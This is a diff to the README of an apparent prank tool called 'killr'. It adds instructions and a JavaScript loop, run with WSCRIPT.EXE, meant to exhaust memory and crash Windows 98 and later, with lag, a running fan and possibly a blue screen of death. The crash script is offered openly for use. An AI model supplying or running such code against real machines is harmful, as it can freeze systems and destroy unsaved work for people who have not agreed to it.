@@ -105,10 +105,38 @@ You can also find the code in the `killr.ts` file.
 
 NOTE: This code will also completly kill the simulator!
 
-## Killing Windows(Windows98 and higher)
+## Killing Windows(Windows ME and higher)
 
-To Kill Windows98 or above, open the MS-DOS prompt. Make sure you have Windows Script Host by running WSCRIPT.EXE. If it shows WSH settings, close them and run `WSCRIPT.EXE path/to/killr.js`.
+To Kill Windows ME or above, open the MS-DOS prompt. Make sure you have Windows Script Host by running WSCRIPT.EXE. If it shows WSH settings, close them and run `WSCRIPT.EXE path/to/killr.js`.
 Your computer will lag, crash, keep the fan on, and depending on the computer and how much RAM is already in use, BSOD(Blue screen of death).
+
+## Killing Windows 98
+Killing Windows98 is almost the same as Killing Windows ME. But in Windows 98, WSCRIPT doesn't support `Array.push`, and therefore has to be rewritten, as so:
+```js
+function ohSnap() {
+  var corruptable=[]
+  corruptable.push=function(e){
+    corruptable[corruptable.length]=e;
+    corruptable.length++
+  }
+  for(var i=0;i<(9999999*999999999999999999999);i++) {
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+  }
+}
+
+ohSnap()
+```
+
 
 ## Killing HTML5 ByteBeat
 
